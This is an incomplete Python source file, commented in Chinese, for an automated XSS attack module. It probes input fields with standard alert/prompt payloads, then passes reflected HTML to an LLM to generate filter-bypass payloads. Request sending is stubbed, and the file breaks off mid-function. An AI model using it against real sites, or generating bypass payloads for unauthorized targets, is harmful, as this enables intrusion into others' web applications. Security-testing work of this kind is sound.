# 导入必要的类型和结构
from typing import Dict, Any, List, Optional

from attacker.attack_target import AttackResult, AttackTarget
from scanner.page_asset import InputField, SiteAsset
from attacker.attack_strategy import AttackStrategy


# 确保您可以访问 Playwright 或 HTTP 客户端
# from playwright.sync_api import Page
# from attack_tools import get_session_client # 假设这是一个获取客户端的函数

class XSSAttacker(AttackStrategy):
    """
    负责执行 XSS 攻击策略。
    主要流程：通用载荷测试 -> LLM分析过滤 -> LLM生成绕过载荷 -> 确认执行。
    """

    def __init__(self, llm_proxy: Any):
        """初始化，传入 LLM 代理。"""
        super().__init__(llm_proxy)

        # 基础 XSS 探测载荷
        self.basic_payloads: List[str] = [
            "<script>alert(1)</script>",  # 经典标签
            "\"'onload=prompt(1)>",  # 事件注入 (针对属性)
            "javascript:prompt(1)",  # 伪协议 (针对 href)
            "<svg/onload=prompt(1)>",  # 无需 <script> 标签
        ]

    def exploit(self, target: AttackTarget, session_context: Dict) -> AttackResult:
        """
        执行 XSS 攻击。
        """
        # 1. 输入校验：XSS 主要针对输入字段 (InputField)
        if not isinstance(target, InputField):
            return AttackResult(
                success=False,
                vulnerability_type='XSS',
                proof_of_concept='',
                details=f"XSS Attacker only supports InputField, received {type(target).__name__}"
            )

        target_input: InputField = target

        print(f"[*] Starting XSS attack on {target_input.page_url} -> {target_input.name}")

        # --- 第一阶段：通用载荷测试 ---
        for payload in self.basic_payloads:
            if self._test_payload(target_input, payload, session_context):
                return AttackResult(
                    success=True,
                    vulnerability_type='XSS',
                    proof_of_concept=payload,
                    details="Basic XSS payload executed successfully."
                )

        # --- 第二阶段：LLM 智能绕过尝试 ---
        print("[*] Basic payloads failed. Engaging LLM for filter analysis and bypass generation...")

        # 1. 运行一个包含多种字符的“指纹”载荷，以获取过滤器的响应
        fingerprint_payload = "<script/xss_test>alert(1);\"'</script>"
        response_data, response_html = self._send_and_capture_response(target_input, fingerprint_payload,
                                                                       session_context)

        if not response_data:
            return AttackResult(success=False, vulnerability_type='XSS', proof_of_concept='',
                                details="Failed to get a valid response for analysis.")

        # 2. 调用 LLM 分析过滤机制并生成新载荷
        print("[*] Consulting LLM to generate custom bypass payloads...")

        # 关键的 LLM 交互点
        llm_context = {
            "target_url": target_input.page_url,
            "target_field_name": target_input.name,
            "field_selector": target_input.css_selector,
            "reflected_response_html": response_html,  # 将响应HTML喂给LLM
            "failed_payload": fingerprint_payload
        }

        # 假设 LLM Proxy 有这个方法，返回针对性的载荷列表
        llm_generated_payloads: List[str] = self.llm.generate_xss_bypass(llm_context)

        # 3. 测试 LLM 生成的载荷
        for payload in llm_generated_payloads:
            if self._test_payload(target_input, payload, session_context):
                return AttackResult(
                    success=True,
                    vulnerability_type='XSS',
                    proof_of_concept=payload,
                    details="XSS successfully bypassed filters using LLM-generated payload."
                )

        # --- 第三阶段：最终失败 ---
        return AttackResult(
            success=False,
            vulnerability_type='XSS',
            proof_of_concept='',
            details="All XSS attempts failed, including LLM-driven bypasses."
        )

    def _send_and_capture_response(self, target: InputField, payload: str, context: Dict) -> tuple[
        Optional[Dict], Optional[str]]:
        """
        发送载荷，返回请求和响应数据。
        这部分逻辑需要依赖 Playwright/Requests 客户端，它应该从 session_context 中获取。
        """
        # 假设 context['client'] 是 Playwright Page 或 Requests Session
        # client = context.get('client')
        # if not client: return None, None

        # 1. 构造请求：将载荷注入到目标字段
        # ... (根据 target.page_url, target.name, target.css_selector 构造请求)

        # 2. 发送请求并获取响应
        # response = client.request(method='GET/POST', url=target.page_url, data/params={target.name: payload})

        # 3. 提取核心数据
        response_data = {"status": 200, "headers": {}, "body_snapshot": "..."}  # 假设提取了部分数据
        response_html = "<html>...反射载荷后的HTML...</html>"  # 假设这是渲染后的HTML

        return response_data, response_html

    def _test_payload(self, target: InputField, payload: str, context: Dict) -> bool:
        """
        发送载荷，并检查 XSS 是否被成功执行。

        这是 XSS 攻击中最难的自动化部分，需要确认载荷是否：
        1. 成功反射到 DOM 中 (反射型/存储型)
        2. 被浏览器解析并执行 (DOM XSS/其他)
        """
        response_data, response_html = self._send_and_capture_response(target, payload, context)

        if not response_html:
            return